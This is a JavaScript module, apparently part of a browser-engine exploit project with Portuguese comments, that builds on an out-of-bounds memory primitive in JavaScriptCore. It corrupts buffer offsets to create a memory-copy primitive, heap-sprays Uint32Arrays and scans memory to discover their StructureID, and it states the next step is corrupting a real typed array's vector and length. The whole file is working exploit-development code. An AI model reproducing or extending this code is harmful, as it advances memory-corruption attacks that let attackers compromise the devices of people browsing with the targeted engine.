// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.22";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_22";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180;

let getter_copy_called_flag_v10_22 = false;

let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null; // O objetivo é descobrir este valor
const PLACEHOLDER_SID_WHEN_UNKNOWN = 0xBADBAD00 | 45; // Novo placeholder


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
// ============================================================
async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
    getter_copy_called_flag_v10_22 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_22 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8);
                }
            } catch (e_getter) {
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_22_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_copy_called_flag_v10_22) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
// ============================================================
async function getStructureIDFromOOB(offset_of_jscell_in_oob) {
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy(offset_of_jscell_in_oob);
    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
        !(copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ) {
        return copied_qword.low();
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.22)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverSID_v10.22_IntensiveScan`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de SID de Uint32Array (Scan Intensivo) ---`, "test", FNAME_CURRENT_TEST);

    let sprayedU32Arrays = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   OBJETIVO: Encontrar o StructureID de Uint32Array. Placeholder atual: ${toHex(PLACEHOLDER_SID_WHEN_UNKNOWN)}`, "info", FNAME_CURRENT_TEST);

        // --- PASSO 1: Pulverizar Uint32Arrays بكثافة ---
        logS3("PASSO 1: Pulverizando Uint32Arrays para descoberta de SID...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 500; // Aumentar MUITO o spray
        const U32_SPRAY_LEN_BASE = 2; // Objetos ainda menores, mais metadados por KB
        sprayedU32Arrays = [];
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedU32Arrays.push(new Uint32Array(U32_SPRAY_LEN_BASE + (i % 2))); // Tamanhos 2 e 3
        }
        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(1000); // Dar mais tempo para a heap assentar após spray intenso

        let found_sids_map = {};
        const SCAN_START = 0x040; // Começar bem cedo no buffer OOB (após possível cabeçalho do oob_array_buffer_real)
        const SCAN_END = Math.min(0x7F80, oob_array_buffer_real.byteLength - 0x20); // Escanear quase todo o buffer de 32KB
        const SCAN_STEP_SID = 0x04; // Scan MUITO denso (a cada 4 bytes)

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (EXTREMAMENTE LENTO!)`, "warn", FNAME_CURRENT_TEST);
        let sids_found_in_scan = 0;
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;

        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
                // Não filtrar SIDs aqui inicialmente, apenas coletar tudo que não for lixo óbvio
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                sids_found_in_scan++;
            }
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 1024) === 0) { // Log de progresso a cada ~4KB
                logS3(`    Scan em ${toHex(offset)}... SIDs únicos até agora: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(5); 
            }
        }
        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (brutos) encontrados.`, "info", FNAME_CURRENT_TEST);

        // Análise de Frequência
        let sorted_sids = Object.keys(found_sids_map).map(k => parseInt(k)).sort((a,b) => found_sids_map[b] - found_sids_map[a]);

        logS3("  Frequência dos SIDs encontrados (todos os valores > 0, top 20):", "info", FNAME_CURRENT_TEST);
        let displayed_sids_count = 0;
        let candidate_sids_for_typed_array = [];

        for(let i=0; i < sorted_sids.length && displayed_sids_count < 20; i++) {
            const sid_val = sorted_sids[i];
            const current_freq = found_sids_map[sid_val];
            logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${current_freq}`, "info", FNAME_CURRENT_TEST);
            displayed_sids_count++;
            // Heurística para identificar SIDs de TypedArray:
            // Eles não são o SID do ArrayBuffer e frequentemente têm uma contagem razoável.
            // E não são valores "muito pequenos" que poderiam ser outros tipos de célula simples.
            if (current_freq > (NUM_U32_SPRAY / 50) && // Pelo menos 1/50 do spray
                sid_val > 0x100000 && // Filtra IDs muito pequenos
                (typeof known_ab_sid !== 'number' || (sid_val & 0xFFFFFF00) !== (known_ab_sid & 0xFFFFFF00)) // Não é ArrayBuffer
            ) {
                candidate_sids_for_typed_array.push({sid: sid_val, count: current_freq});
            }
        }
        
        if (candidate_sids_for_typed_array.length > 0) {
            // Pega o mais frequente dos candidatos filtrados
            candidate_sids_for_typed_array.sort((a,b) => b.count - a.count);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = candidate_sids_for_typed_array[0].sid;
            logS3(`  !!!! StructureID MAIS PROMISSOR (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${candidate_sids_for_typed_array[0].count}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array suficientemente proeminente/confiável encontrado após filtros.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_WHEN_UNKNOWN;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);

        // --- PASSO FUTURO: Usar o SID descoberto para corromper m_vector/m_length ---
        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_WHEN_UNKNOWN) {
            logS3(`  Próximo passo: Usar SID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} para corromper um Uint32Array real.`, "info", FNAME_CURRENT_TEST);
        }


    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedU32Arrays = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
